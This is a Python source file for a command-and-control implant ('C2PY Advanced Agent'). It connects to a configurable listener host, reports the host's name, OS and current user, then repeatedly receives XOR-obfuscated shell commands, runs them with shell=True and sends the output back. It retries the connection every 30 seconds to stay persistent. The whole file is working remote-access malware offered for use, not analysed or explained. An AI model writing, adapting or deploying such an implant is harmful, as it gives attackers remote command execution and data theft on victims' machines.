#!/usr/bin/env python3
"""
C2PY Advanced Agent - Full Featured
XOR encrypted communication with c2py server
"""

import socket
import subprocess
import os
import sys
import time
import json
import base64
from datetime import datetime


def xor_encrypt_decrypt(data, key="SecureKey2024!!!"):
    """XOR encryption/decryption with proper UTF-8 handling"""
    if isinstance(data, str):
        data_bytes = data.encode('utf-8', errors='replace')
    else:
        data_bytes = data

    if isinstance(key, str):
        key_bytes = key.encode('utf-8', errors='replace')
    else:
        key_bytes = key

    result = bytearray()
    for i in range(len(data_bytes)):
        result.append(data_bytes[i] ^ key_bytes[i % len(key_bytes)])

    return bytes(result)


def get_system_info():
    """Gather basic system information"""
    import platform
    
    info = {
        'hostname': platform.node(),
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.machine(),
        'python_version': platform.python_version(),
        'user': os.environ.get('USER') or os.environ.get('USERNAME', 'unknown'),
    }
    
    return info


def execute_command(command):
    """Execute shell command and return output"""
    try:
        output = subprocess.check_output(
            command,
            shell=True,
            stderr=subprocess.STDOUT,
            timeout=30
        )
        return output
    except subprocess.TimeoutExpired:
        return b"Command execution timeout (30s)"
    except Exception as e:
        return str(e).encode()


def connect_to_c2(lhost, lport, retry=True, retry_delay=30):
    """
    Connect to C2 server with optional retry
    
    Args:
        lhost: Listener host IP
        lport: Listener port
        retry: Whether to retry on connection failure
        retry_delay: Seconds to wait between retries
    """
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((lhost, lport))
            
            # Send initial info
            try:
                info = get_system_info()
                info_json = json.dumps(info)
                encrypted_info = xor_encrypt_decrypt(info_json)
                sock.sendall(encrypted_info)
            except:
                pass  # Continue even if info send fails
            
            # Main command loop
            while True:
                encrypted_cmd = sock.recv(4096)
                
                if not encrypted_cmd:
                    break
                
                # Decrypt command
                try:
                    cmd = xor_encrypt_decrypt(encrypted_cmd).decode('utf-8', errors='replace')
                except:
                    continue
                
                if cmd.lower().strip() == 'exit':
                    break
                
                # Execute command
                output = execute_command(cmd)
                
                # Encrypt and send response
                encrypted_output = xor_encrypt_decrypt(output)
                sock.sendall(encrypted_output)
            
            sock.close()
            break
            
        except Exception as e:
            if retry:
                time.sleep(retry_delay)
                continue
            else:
                break


if __name__ == "__main__":
    # Configuration
    LHOST = "REPLACE_WITH_LHOST"
    LPORT = REPLACE_WITH_LPORT
    
    # Connect to C2 with persistence
    connect_to_c2(LHOST, LPORT, retry=True, retry_delay=30)
